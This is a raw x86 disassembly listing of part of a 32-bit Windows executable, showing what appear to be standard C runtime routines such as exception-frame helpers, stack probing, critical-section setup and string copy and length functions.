  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
